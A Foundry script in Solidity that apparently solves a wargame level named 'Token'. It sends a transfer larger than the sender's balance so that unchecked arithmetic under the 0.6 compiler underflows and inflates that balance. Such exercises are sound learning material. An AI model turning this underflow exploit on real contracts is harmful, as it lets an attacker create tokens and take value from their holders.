// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenScript is Script {

    Token public token;

    constructor() public {
        token = Token(vm.envAddress("TOKEN_INSTANCE"));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");
        vm.startBroadcast(pk);
        token.transfer(address(this), 42);
        token.transfer(vm.addr(pk), token.balanceOf(vm.addr(pk)));
        vm.stopBroadcast();
        console.log("Balance: ", token.balanceOf(vm.addr(pk)));
    }

    // forge script script/token.s.sol:TokenScript --broadcast
}

